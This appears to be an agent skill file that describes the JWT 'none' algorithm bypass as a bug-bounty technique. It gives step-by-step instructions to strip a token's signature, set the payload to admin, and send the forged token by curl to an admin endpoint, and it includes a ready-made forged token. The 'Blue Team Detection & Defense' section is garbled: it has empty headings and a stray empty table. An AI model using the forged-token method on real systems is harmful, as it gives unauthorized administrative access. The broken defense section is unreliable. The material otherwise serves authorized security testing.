---
name: jwt-null-signature
description: >
  Exploit JSON Web Tokens (JWT) by implementing the 'None' algorithm attack. This skill 
  details how to bypass authentication mechanisms when a server improperly accepts JWTs 
  with the `alg` header set to `none`, allowing attackers to forge tokens without a valid signature.
domain: cybersecurity
subdomain: bug-hunting
category: APIs
difficulty: beginner
estimated_time: "30-45 mins"
mitre_attack:
  tactics: [TA0006, TA0004]
  techniques: [T1550.004]
platforms: [web, api]
tags: [jwt, authentication-bypass, none-algorithm, web-vulnerabilities, api-security]
tools: [burp-suite, jwt_tool, base64]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# JWT 'None' Algorithm Bypass

## When to Use
- When assessing web applications or microservices that utilize JWTs for authentication and authorization.
- Specifically during the initial phases of analyzing a JWT implementation to check for fundamental configuration flaws in token verification.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Capture and Decode the Token

Intercept a valid request containing your JWT (usually in the `Authorization: Bearer <token>` header or a cookie). A JWT consists of three base64-url encoded parts separated by periods: `Header.Payload.Signature`.

```bash
# Concept: Decode the Header and Payload Token: eyJhbGciOiJIUzI1NiIsInR5cCI...
echo "eyJhbGciOiJIUzI1NiIsInR5cCI..." | base64 -d
# Header Output: {"alg":"HS256","typ":"JWT"}
```

### Phase 2: Modify Header to 'None' Algorithm

Change the `alg` value in the header. Servers might accept variations of the string "none".

```json
// {"alg": "none", "typ": "JWT"}
// Other variations to try: "None", "NONE", "nOnE"
```
Re-encode this modified header to Base64-URL format (ensure no padding `=`).

### Phase 3: Modify Payload (Elevation of Privilege)

Modify the payload to elevate privileges or impersonate another user.

```json
// {"sub": "admin", "iat": 1516239022, "admin": true}
```
Re-encode the modified payload to Base64-URL format.

### Phase 4: Construct and Send the Forged Token

Combine the new header and payload, appending a trailing dot, but **remove the signature completely**.

```text
# [Base64_Header_None].[Base64_Payload_Admin].
```

Send the request with the new token via Burp Suite or curl.

```bash
# curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiYWRtaW4iOnRydWV9." http://target.local/api/admin
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Capture JWT ] --> B[Decode Header & Payload ]
    B --> C[Change alg to 'none' ]
    C --> D[Modify Payload ]
    D --> E[Re-encode (No Signature) ]
    E --> F{Bypass Successful? ]}
    F -->|Yes| G[Privilege Escalated ]
    F -->|No| H[Try other JWT attacks ]
```


## 🔵 Blue Team Detection & Defense
- **Enforce Algorithm Verification**: **Library Configuration**: **Reject 'None' Explicitly**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Jwt Null Signature — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [JWT Algorithms](https://portswigger.net/web-security/jwt)
- RFC 7519: [JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
